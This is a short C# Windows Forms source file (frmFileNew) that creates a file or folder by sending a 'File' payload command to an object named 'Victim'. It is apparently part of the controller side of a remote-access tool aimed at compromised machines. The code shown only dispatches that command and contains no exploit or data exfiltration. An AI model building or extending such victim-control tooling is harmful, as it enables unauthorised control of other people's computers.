using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reception
{
    public partial class frmFileNew : Form
    {
        public Victim v;
        public string cp;
        public bool is_folder = false;

        public frmFileNew()
        {
            InitializeComponent();
        }

        void setup()
        {
            if (is_folder) radioButton2.Checked = true;
            else radioButton1.Checked = true;

            textBox1.Text = $@"{C1.DateTimeName("txt")}";
        }

        private void frmFileNew_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            v.RunPayload("File", v, new string[] { radioButton1.Checked ? "n_t" : "n_f", Path.Combine(cp, textBox1.Text) });
            DialogResult = DialogResult.OK;
            ActiveForm.Close();
        }
    }
}